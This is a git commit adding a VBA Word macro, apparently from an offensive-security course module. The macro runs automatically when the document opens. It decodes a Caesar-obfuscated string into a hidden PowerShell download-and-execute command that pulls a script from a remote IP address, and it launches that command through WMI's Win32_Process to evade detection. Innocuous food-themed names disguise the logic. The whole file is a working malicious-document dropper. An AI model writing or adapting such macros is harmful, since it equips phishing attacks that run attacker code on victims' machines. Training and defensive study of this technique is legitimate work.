79d4d8a8058caee1e155b42ec40eb30417620698
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-09 18:49:34 +0100

    Create macro_wmi_caesar.vb

---
+++ module_6/macro_wmi_caesar.vb
@@ -0,0 +1,37 @@
+' executed with min version of nish
+
+Function Pears(Beets)
+  Pears = Chr(Beets - 17)
+End Function
+
+Function Strawberries(Grapes)
+  Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+  Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+  Do
+  Oatmilk = Oatmilk + Pears(Strawberries(Milk))
+  Milk = Almonds(Milk)
+  Loop While Len(Milk) > 0
+  Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+  Dim Apples As String
+  Dim Water As String
+  Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069074063072066064131134127063133137133056058058"
+  Water = Nuts(Apples)
+ 
+  GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+
+End Function
+
+Sub Document_Open()
+  MyMacro
+
+
+End Sub
